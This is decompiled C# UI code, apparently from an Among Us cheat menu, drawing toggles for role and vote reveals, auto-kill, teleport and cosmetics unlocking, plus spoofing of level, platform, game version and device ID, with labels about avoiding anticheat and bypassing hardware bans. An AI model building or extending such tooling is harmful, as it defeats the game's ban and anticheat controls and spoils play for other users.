      this.DrawToggleSwitch("Copy Code on Disconnect", ref ChocooPlugin.AutoCopyCodeEnabled);
      GUI.enabled = Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null) && Object.op_Inequality((Object) ShipStatus.Instance, (Object) null) && Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).GameState == 2;
      this.DrawToggleSwitch("Become Immortal", ref ChocooPlugin.BecomeImmortalEnabled);
      GUI.enabled = true;
      this.DrawToggleSwitch("Dark Mode", ref ChocooPlugin.DarkModeEnabled);
      this.DrawToggleSwitch("See Mod Users", ref ChocooPlugin.SeeModUsersEnabled);
      this.DrawToggleSwitch("Show Host", ref ChocooPlugin.ShowHostEnabled);
      this.DrawToggleSwitch("See Ghosts", ref ChocooPlugin.SeeGhostsEnabled);
      this.DrawToggleSwitch("Always Chat", ref ChocooPlugin.AlwaysShowChatEnabled);
      this.DrawToggleSwitch("Reduce Chat Cooldown", ref ChocooPlugin.ReduceChatCooldownEnabled);
      this.DrawToggleSwitch("Allow Ctrl+(C/V) in Chat", ref ChocooPlugin.AllowCtrlCVEnabled);
      this.DrawToggleSwitch("Bypass URL Block", ref ChocooPlugin.BypassURLBlockEnabled);
      this.DrawToggleSwitch("Allow All Characters", ref ChocooPlugin.AllowAllCharactersEnabled);
      this.DrawToggleSwitch("Extend Chat Character Limit", ref ChocooPlugin.ExtendChatLimitEnabled);
      this.DrawToggleSwitch("Extend Chat History", ref ChocooPlugin.ExtendChatHistoryEnabled);
      this.DrawToggleSwitch("No Shadows", ref ChocooPlugin.NoShadowsEnabled);
      this.DrawToggleSwitch("Reveal Roles", ref ChocooPlugin.SeeRolesEnabled);
      this.DrawToggleSwitch("Reveal Votes", ref ChocooPlugin.RevealVotesEnabled);
      this.DrawToggleSwitch("Zoom Out", ref ChocooPlugin.ZoomOutEnabled);
      this.DrawToggleSwitch("Kill Other Imposters", ref ChocooPlugin.KillOtherImpostersEnabled);
      this.DrawToggleSwitch("Bypass Visual Tasks Being Off", ref ChocooPlugin.BypassVisualTasksEnabled);
      if (ChocooPlugin.BypassVisualTasksEnabled)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        if (Object.op_Inequality((Object) AmongUsClient.Instance, (Object) null) && (((InnerNetClient) AmongUsClient.Instance).AmHost || ((InnerNetClient) AmongUsClient.Instance).AmClient))
        {
          try
          {
            if (!GameOptionsManager.Instance.CurrentGameOptions.GetBool((BoolOptionNames) 1))
            {
              GUI.contentColor = Color.green;
              GUILayout.Label("✓ Visual tasks are disabled in this lobby, bypassing it...", new GUIStyle(GUI.skin.label)
              {
                fontStyle = (FontStyle) 1,
                fontSize = 10,
                alignment = (TextAnchor) 4
              }, (Il2CppReferenceArray<GUILayoutOption>) null);
            }
            else
            {
              GUI.contentColor = Color.red;
              GUILayout.Label("⚠ Visual tasks are already enabled in the lobby", new GUIStyle(GUI.skin.label)
              {
                fontStyle = (FontStyle) 1,
                fontSize = 10,
                alignment = (TextAnchor) 4
              }, (Il2CppReferenceArray<GUILayoutOption>) null);
            }
          }
          catch
          {
            GUI.contentColor = Color.gray;
            GUILayout.Label("Unable to read lobby settings", new GUIStyle(GUI.skin.label)
            {
              fontSize = 9,
              alignment = (TextAnchor) 4
            }, (Il2CppReferenceArray<GUILayoutOption>) null);
          }
        }
        else
        {
          GUI.contentColor = Color.gray;
          GUILayout.Label("Join a lobby to see visual task status", new GUIStyle(GUI.skin.label)
          {
            fontSize = 9,
            alignment = (TextAnchor) 4
          }, (Il2CppReferenceArray<GUILayoutOption>) null);
        }
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      this.DrawToggleSwitch("Disable Venting for All", ref ChocooPlugin.DisableVentingEnabled);
      this.DrawToggleSwitch("Auto Kill", ref ChocooPlugin.AutoKillEnabled);
      this.DrawToggleSwitch("See Protections", ref ChocooPlugin.SeeProtectionsEnabled);
      this.DrawToggleSwitch("See Phantoms", ref ChocooPlugin.SeePhantomsEnabled);
      this.DrawToggleSwitch("See Players in Vents", ref ChocooPlugin.SeePlayersInVentsEnabled);
      this.DrawToggleSwitch("Unlock Vents", ref ChocooPlugin.UnlockVentsEnabled);
      this.DrawToggleSwitch("Skip Death Animation", ref ChocooPlugin.DisableKillAnimationEnabled);
      this.DrawToggleSwitch("No Seeker Animation", ref ChocooPlugin.NoSeekerAnimEnabled);
      this.DrawToggleSwitch("No Shh Screen", ref ChocooPlugin.NoShhScreenEnabled);
      this.DrawToggleSwitch("TP to Cursor", ref ChocooPlugin.TeleportToCursorEnabled);
      this.DrawToggleSwitch("Slide by Cursor", ref ChocooPlugin.MoveSelfByCursorEnabled);
      this.DrawToggleSwitch("Unlock Cosmetics", ref ChocooPlugin.CosmeticsUnlockerEnabled);
      this.DrawToggleSwitch("More Lobby Info", ref ChocooPlugin.MoreLobbyInfoEnabled);
      this.DrawToggleSwitch("Avoid Penalties", ref ChocooPlugin.AvoidPenaltiesEnabled);
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.4f, 1f);
      if (GUILayout.Button("RESET ROTATION", new GUILayoutOption[1]
      {
        GUILayout.Height(30f)
      }))
        this.ResetCharacterRotation();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndScrollView();
    }

    private void DrawCustomisationsTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.7f, 0.3f, 1f);
      GUILayout.Label("Settings Options", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.customiseScrollPosition = GUILayout.BeginScrollView(this.customiseScrollPosition, false, true, GUIStyle.none, GUI.skin.verticalScrollbar, Array.Empty<GUILayoutOption>());
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.8f, 0.2f);
      GUILayout.Label("Menu Opacity", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("Transparency:", new GUILayoutOption[1]
      {
        GUILayout.Width(100f)
      });
      GUILayout.Label($"{(ValueType) (float) ((double) ChocooPlugin.MenuOpacity * 100.0):F0}%", new GUILayoutOption[1]
      {
        GUILayout.Width(40f)
      });
      Color backgroundColor = GUI.backgroundColor;
      GUI.backgroundColor = Color.white;
      float num1 = GUILayout.HorizontalSlider(ChocooPlugin.MenuOpacity, 0.0f, 1f, new GUILayoutOption[1]
      {
        GUILayout.Width(95f)
      });
      if ((double) Math.Abs(num1 - ChocooPlugin.MenuOpacity) > 1.0 / 1000.0)
        ChocooPlugin.MenuOpacity = (float) Math.Round((double) num1, 2);
      GUI.backgroundColor = backgroundColor;
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.FlexibleSpace();
      if (GUILayout.Button("Reset Menu Transparency", new GUILayoutOption[2]
      {
        GUILayout.Width(200f),
        GUILayout.Height(25f)
      }))
        ChocooPlugin.MenuOpacity = 1f;
      GUILayout.FlexibleSpace();
      GUILayout.EndHorizontal();
      GUI.backgroundColor = backgroundColor;
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.2f, 0.8f, 1f);
      GUILayout.Label("Menu Font Size", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.Label("Font Size:", new GUILayoutOption[1]
      {
        GUILayout.Width(100f)
      });
      GUI.backgroundColor = Color.white;
      ChocooPlugin.MenuFontSize = (int) GUILayout.HorizontalSlider((float) ChocooPlugin.MenuFontSize, 8f, 20f, new GUILayoutOption[1]
      {
        GUILayout.Width(95f)
      });
      GUI.backgroundColor = backgroundColor;
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.FlexibleSpace();
      if (GUILayout.Button("Reset Text Size", new GUILayoutOption[2]
      {
        GUILayout.Width(200f),
        GUILayout.Height(25f)
      }))
        ChocooPlugin.MenuFontSize = 12;
      GUILayout.FlexibleSpace();
      GUILayout.EndHorizontal();
      GUI.backgroundColor = backgroundColor;
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.2f);
      GUILayout.Label("Game FPS Limit", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUILayout.Label("Target FPS:", new GUILayoutOption[1]
      {
        GUILayout.Width(100f)
      });
      GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
      Rect rect1 = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
      {
        GUILayout.Height(24f),
        GUILayout.Width(160f)
      });
      GUI.Box(rect1, "", GUI.skin.box);
      if (GUI.Button(rect1, "", GUIStyle.none))
        this.fpsInputFocused = true;
      Rect rect2;
      // ISSUE: explicit constructor call
      ((Rect) ref rect2).\u002Ector(((Rect) ref rect1).x + 4f, ((Rect) ref rect1).y + 4f, ((Rect) ref rect1).width - 8f, ((Rect) ref rect1).height - 8f);
      GUIStyle guiStyle1 = new GUIStyle(GUI.skin.label)
      {
        fontSize = 11,
        alignment = (TextAnchor) 3,
        normal = new GUIStyleState()
        {
          textColor = Color.white
        }
      };
      string str1 = this.fpsInputText;
      if (this.fpsInputFocused && ChocooPlugin.ChocooMenu.fpsCursorVisible)
        str1 = this.fpsInputText.Insert(Mathf.Clamp(ChocooPlugin.ChocooMenu.fpsCursorPos, 0, this.fpsInputText.Length), "|");
      if (string.IsNullOrEmpty(this.fpsInputText) && !this.fpsInputFocused)
      {
        GUI.contentColor = Color.gray;
        GUI.Label(rect2, "60", guiStyle1);
        GUI.contentColor = ChocooPlugin.GetRGBText();
      }
      else
        GUI.Label(rect2, str1, guiStyle1);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUILayout.FlexibleSpace();
      int result1;
      if (GUILayout.Button("Set FPS", new GUILayoutOption[2]
      {
        GUILayout.Width(160f),
        GUILayout.Height(25f)
      }) && int.TryParse(this.fpsInputText, out result1))
      {
        result1 = Mathf.Clamp(result1, 10, 999);
        ChocooPlugin.GameSpeed = 1f;
        Application.targetFrameRate = result1;
        this.fpsInputText = result1.ToString();
        this.fpsInputFocused = false;
      }
      GUILayout.FlexibleSpace();
      GUILayout.EndHorizontal();
      GUI.backgroundColor = backgroundColor;
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(15f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.0f);
      GUILayout.Label("Spoofing", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.DrawToggleSwitch("Spoof Level", ref ChocooPlugin.ShowLevelSpoof);
      if (ChocooPlugin.ShowLevelSpoof)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUILayout.Label("Level:", new GUILayoutOption[1]
        {
          GUILayout.Width(50f)
        });
        GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
        Rect rect3 = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
        {
          GUILayout.Height(24f),
          GUILayout.Width(160f)
        });
        GUI.Box(rect3, "", GUI.skin.box);
        if (GUI.Button(rect3, "", GUIStyle.none))
          this.levelInputFocused = true;
        Rect rect4;
        // ISSUE: explicit constructor call
        ((Rect) ref rect4).\u002Ector(((Rect) ref rect3).x + 4f, ((Rect) ref rect3).y + 4f, ((Rect) ref rect3).width - 8f, ((Rect) ref rect3).height - 8f);
        GUIStyle guiStyle2 = new GUIStyle(GUI.skin.label)
        {
          fontSize = 11,
          alignment = (TextAnchor) 3,
          normal = new GUIStyleState()
          {
            textColor = Color.white
          }
        };
        string str2 = this.levelInputText;
        if (this.levelInputFocused && ChocooPlugin.ChocooMenu.levelCursorVisible)
          str2 = this.levelInputText.Insert(Mathf.Clamp(ChocooPlugin.ChocooMenu.levelCursorPos, 0, this.levelInputText.Length), "|");
        if (string.IsNullOrEmpty(this.levelInputText) && !this.levelInputFocused)
        {
          GUI.contentColor = Color.gray;
          GUI.Label(rect4, "e.g. 100", guiStyle2);
          GUI.contentColor = ChocooPlugin.GetRGBText();
        }
        else
          GUI.Label(rect4, str2, guiStyle2);
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.Space(5f);
        GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
        GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
        GUILayout.FlexibleSpace();
        int result2;
        if (GUILayout.Button("Set Level", new GUILayoutOption[2]
        {
          GUILayout.Width(160f),
          GUILayout.Height(25f)
        }) && int.TryParse(this.levelInputText, out result2))
        {
          result2 = Mathf.Clamp(result2, 1, 100001);
          ChocooPlugin.SpoofedLevel = result2;
          ChocooPlugin.Config_SpoofedLevel.Value = result2;
          this.levelInputText = result2.ToString();
          this.levelInputFocused = false;
        }
        GUILayout.FlexibleSpace();
        GUILayout.EndHorizontal();
        GUI.backgroundColor = backgroundColor;
        GUILayout.Space(5f);
        GUI.contentColor = Color.gray;
        GUILayout.Label("Safe range: 1-100001 (to avoid anticheat)", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          fontStyle = (FontStyle) 2
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      else
      {
        ChocooPlugin.SpoofedLevel = 0;
        ChocooPlugin.Config_SpoofedLevel.Value = 0;
        this.levelInputText = "";
        if (Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer.Data, (Object) null))
          PlayerControl.LocalPlayer.RpcSetLevel(PlayerControl.LocalPlayer.Data.PlayerLevel);
      }
      this.DrawToggleSwitch("Spoof Platform", ref ChocooPlugin.ShowPlatformSpoof);
      if (ChocooPlugin.ShowPlatformSpoof)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        string platformName = ChocooPlugin.PlatformNames[ChocooPlugin.SelectedPlatformIndex];
        GUI.backgroundColor = new Color(0.3f, 0.3f, 0.4f, 1f);
        if (GUILayout.Button("▼ " + platformName, new GUILayoutOption[1]
        {
          GUILayout.Height(30f)
        }))
          this.showPlatformDropdown = !this.showPlatformDropdown;
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        float dropdownHeight = this.GetDropdownHeight("platform", this.showPlatformDropdown, 150f);
        if ((double) dropdownHeight > 1.0)
        {
          GUILayout.Space(5f);
          GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f);
          GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
          this.platformDropdownScrollPosition = GUILayout.BeginScrollView(this.platformDropdownScrollPosition, new GUILayoutOption[1]
          {
            GUILayout.Height(dropdownHeight)
          });
          for (int index = 0; index < ChocooPlugin.PlatformNames.Length; ++index)
          {
            GUI.backgroundColor = ChocooPlugin.SelectedPlatformIndex == index ? new Color(1f, 0.5f, 0.2f, 1f) : new Color(0.25f, 0.25f, 0.25f, 1f);
            if (GUILayout.Button(ChocooPlugin.PlatformNames[index], new GUILayoutOption[1]
            {
              GUILayout.Height(25f)
            }))
            {
              ChocooPlugin.SelectedPlatformIndex = index;
              ChocooPlugin.Config_SelectedPlatformIndex.Value = index;
              this.showPlatformDropdown = false;
              ChocooPlugin.SpoofedPlatform = index != 0 ? ChocooPlugin.PlatformEnumNames[index] : "";
              ChocooPlugin.Config_SpoofedPlatform.Value = ChocooPlugin.PlatformEnumNames[index];
              ChocooPlugin.RefreshAllPlayerNametags();
            }
          }
          GUI.backgroundColor = ChocooPlugin.GetRGBColor();
          GUILayout.EndScrollView();
          GUILayout.EndVertical();
        }
        int num2 = Array.IndexOf<string>(ChocooPlugin.PlatformNames, "Custom");
        if (ChocooPlugin.SelectedPlatformIndex == num2)
        {
          GUILayout.Space(5f);
          GUILayout.Label("Custom Platform Name:", new GUILayoutOption[1]
          {
            GUILayout.Width(160f)
          });
          GUI.backgroundColor = new Color(0.2f, 0.2f, 0.2f, 1f);
          this.customPlatformInputRect = GUILayoutUtility.GetRect(GUIContent.none, GUI.skin.box, new GUILayoutOption[2]
          {
            GUILayout.Height(24f),
            GUILayout.Width(160f)
          });
          GUI.Box(this.customPlatformInputRect, "", GUI.skin.box);
          if (GUI.Button(this.customPlatformInputRect, "", GUIStyle.none))
          {
            this.customPlatformInputFocused = true;
            ChocooPlugin.ChocooMenu.customPlatformCursorPos = this.customPlatformInputText.Length;
          }
          Rect rect5;
          // ISSUE: explicit constructor call
          ((Rect) ref rect5).\u002Ector(((Rect) ref this.customPlatformInputRect).x + 4f, ((Rect) ref this.customPlatformInputRect).y + 4f, ((Rect) ref this.customPlatformInputRect).width - 8f, ((Rect) ref this.customPlatformInputRect).height - 8f);
          GUIStyle guiStyle3 = new GUIStyle(GUI.skin.label)
          {
            fontSize = 11,
            alignment = (TextAnchor) 3,
            normal = new GUIStyleState()
            {
              textColor = Color.white
            }
          };
          string str3 = this.customPlatformInputText;
          if (this.customPlatformInputFocused && ChocooPlugin.ChocooMenu.customPlatformCursorVisible)
            str3 = this.customPlatformInputText.Insert(Mathf.Clamp(ChocooPlugin.ChocooMenu.customPlatformCursorPos, 0, this.customPlatformInputText.Length), "|");
          if (string.IsNullOrEmpty(this.customPlatformInputText) && !this.customPlatformInputFocused)
          {
            GUI.contentColor = Color.gray;
            GUI.Label(rect5, "e.g. Switch", guiStyle3);
            GUI.contentColor = ChocooPlugin.GetRGBText();
          }
          else
            GUI.Label(rect5, str3, guiStyle3);
          GUI.backgroundColor = new Color(0.3f, 0.3f, 0.3f, 1f);
          GUILayout.Space(4f);
          GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
          GUILayout.FlexibleSpace();
          if (GUILayout.Button("Apply", new GUILayoutOption[2]
          {
            GUILayout.Width(160f),
            GUILayout.Height(25f)
          }) && !string.IsNullOrEmpty(this.customPlatformInputText))
          {
            ChocooPlugin.SpoofedPlatform = "__custom:" + this.customPlatformInputText;
            ChocooPlugin.Config_SpoofedPlatform.Value = ChocooPlugin.SpoofedPlatform;
            ChocooPlugin.Config_CustomPlatformInputText.Value = this.customPlatformInputText;
            ChocooPlugin.RefreshAllPlayerNametags();
            this.customPlatformInputFocused = false;
          }
          GUILayout.FlexibleSpace();
          GUILayout.EndHorizontal();
          GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        }
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      else
      {
        ChocooPlugin.SpoofedPlatform = "";
        ChocooPlugin.SelectedPlatformIndex = 0;
        ChocooPlugin.Config_SpoofedPlatform.Value = "";
        ChocooPlugin.Config_SelectedPlatformIndex.Value = 0;
        ChocooPlugin.Config_CustomPlatformInputText.Value = "";
        ChocooPlugin.SelectedPlatformIndex = 0;
      }
      this.DrawToggleSwitch("Bypass Platform Spoof Detections", ref ChocooPlugin.BypassPlatformDetectionEnabled);
      this.DrawToggleSwitch("Spoof Device ID", ref ChocooPlugin.SpoofDeviceIdEnabled);
      if (ChocooPlugin.SpoofDeviceIdEnabled)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.gray;
        GUILayout.Label("Hides your real device ID. Helps bypass hardware bans.", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          fontStyle = (FontStyle) 2
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      this.DrawToggleSwitch("Disable Telemetry", ref ChocooPlugin.DisableTelemetryEnabled);
      if (ChocooPlugin.DisableTelemetryEnabled)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        GUI.contentColor = Color.gray;
        GUILayout.Label("Prevents game from sending analytics to Innersloth.", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          fontStyle = (FontStyle) 2
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      this.DrawToggleSwitch("Spoof Game Version", ref ChocooPlugin.SpoofGameVersionEnabled);
      if (ChocooPlugin.SpoofGameVersionEnabled)
      {
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
        List<string> stringList = new List<string>((IEnumerable<string>) ChocooPlugin.GameVersions.Keys);
        string str4 = stringList[ChocooPlugin.SelectedVersionIndex];
        GUI.backgroundColor = new Color(0.3f, 0.3f, 0.4f, 1f);
        if (GUILayout.Button("▼ " + str4, new GUILayoutOption[1]
        {
          GUILayout.Height(30f)
        }))
          this.showVersionDropdown = !this.showVersionDropdown;
        GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
        if (this.showVersionDropdown)
        {
          GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
          for (int index = 0; index < stringList.Count; ++index)
          {
            GUI.backgroundColor = ChocooPlugin.SelectedVersionIndex == index ? new Color(0.2f, 0.7f, 0.9f, 1f) : new Color(0.3f, 0.3f, 0.3f, 1f);
            if (GUILayout.Button(stringList[index], new GUILayoutOption[1]
            {
              GUILayout.Height(25f)
            }))
            {
              ChocooPlugin.SelectedVersionIndex = index;
              ChocooPlugin.SpoofedGameVersion = ChocooPlugin.GameVersions[stringList[index]];
              ChocooPlugin.Config_SelectedVersionIndex.Value = index;
              ChocooPlugin.Config_SpoofedGameVersion.Value = ChocooPlugin.SpoofedGameVersion;
              this.showVersionDropdown = false;
            }
            GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
          }
          GUILayout.EndVertical();
        }
        GUILayout.Space(5f);
        this.DrawToggleSwitch("Use Modded Protocol", ref ChocooPlugin.UseModdedProtocol);
        GUI.contentColor = Color.gray;
        GUILayout.Label("Adds +25 to version. Use for modded servers.", new GUIStyle(GUI.skin.label)
        {
          fontSize = 9,
          fontStyle = (FontStyle) 2
        }, (Il2CppReferenceArray<GUILayoutOption>) null);
        GUI.contentColor = ChocooPlugin.GetRGBText();
        GUILayout.EndVertical();
        GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      }
      GUILayout.EndVertical();
      GUILayout.Space(10f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.6f, 0.3f);
      GUILayout.Label("Others", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      this.DrawToggleSwitch("Show Menu on Startup", ref ChocooPlugin.ShowMenuOnStartup);
      this.DrawToggleSwitch("Disable Custom Theme", ref ChocooPlugin.DisableCustomTheme);
      this.DrawToggleSwitch("Move Menu to Cursor", ref ChocooPlugin.MoveMenuToCursor);
      this.DrawToggleSwitch("Disable Animations", ref ChocooPlugin.DisableAnimations);
      GUILayout.EndVertical();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndScrollView();
    }

    private void DrawMapTab()
    {
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.3f, 0.7f, 1f);
      GUILayout.Label("Map Controls", new GUIStyle(GUI.skin.label)
      {
        fontSize = 14,
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(10f);
      this.scrollPosition = GUILayout.BeginScrollView(this.scrollPosition, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.8f, 0.3f);
      GUILayout.Label("Lobby Controls", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.3f, 1f);
      if (GUILayout.Button("SPAWN LOBBY", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.SpawnLobby();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.8f, 0.3f, 0.2f, 1f);
      if (GUILayout.Button("DESPAWN LOBBY", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.DespawnLobby();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUILayout.Space(15f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(1f, 0.5f, 0.8f);
      GUILayout.Label("MeetingHud Controls", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.2f, 0.7f, 0.3f, 1f);
      if (GUILayout.Button("SPAWN MEETINGHUD", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.SpawnMeetingHud();
      GUILayout.Space(5f);
      GUI.backgroundColor = new Color(0.8f, 0.3f, 0.2f, 1f);
      if (GUILayout.Button("DESPAWN MEETINGHUD", new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }))
        this.DespawnMeetingHud();
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.EndVertical();
      GUILayout.Space(15f);
      GUI.backgroundColor = ChocooPlugin.GetRGBAccent();
      GUILayout.BeginVertical(GUIStyle.op_Implicit("box"), Array.Empty<GUILayoutOption>());
      GUI.contentColor = ChocooPlugin.RGBMode ? ChocooPlugin.GetRGBText() : new Color(0.5f, 0.8f, 1f);
      GUILayout.Label("Ship Controls", new GUIStyle(GUI.skin.label)
      {
        fontStyle = (FontStyle) 1
      }, (Il2CppReferenceArray<GUILayoutOption>) null);
